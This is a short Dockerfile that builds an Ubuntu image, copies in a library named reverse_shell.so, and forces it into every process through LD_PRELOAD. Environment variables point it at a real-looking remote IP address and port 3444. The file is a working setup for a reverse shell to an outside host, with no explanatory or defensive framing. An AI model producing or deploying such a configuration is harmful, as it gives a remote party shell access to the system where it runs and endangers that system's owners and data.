FROM ubuntu:latest

COPY reverse_shell.so /usr/share/lib/reverse_shell.so
ENV LD_PRELOAD=/usr/share/lib/reverse_shell.so
ENV REMOTE_ADDR=104.236.13.229
ENV REMOTE_PORT=3444

CMD ["/bin/bash"]